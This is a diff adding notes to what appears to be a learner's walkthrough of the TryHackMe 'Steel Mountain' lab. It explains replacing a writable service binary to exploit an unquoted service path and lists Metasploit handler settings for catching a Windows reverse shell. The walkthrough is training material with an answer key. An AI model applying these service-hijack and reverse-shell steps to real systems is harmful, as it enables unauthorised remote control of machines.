@@ -71,3 +71,15 @@
 - Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
     - Picture: [Steel_Moutain_17.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_16.png)
     - **Answer** : AdvancedSystemCareService9
+> The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able.
+> This means we can replace the legitimate application with our malicious one, restart the service,which will run our infected program!
+- Use msfvenom to generate a reverse shell as an Windows executable.
+    - Exit
+    - put the current meterpreter in "Background"
+    - Preapare the reverse tcp
+        - use exploit/multi/handler
+        - set payload windows/shell/reverse_tcp
+        - Check the options --> Show Options
+            - set LHOSTS [Local machine IP]
+            - set LPORT [port] --> Same port defined in the reveserse tcp
+            - exploit -j
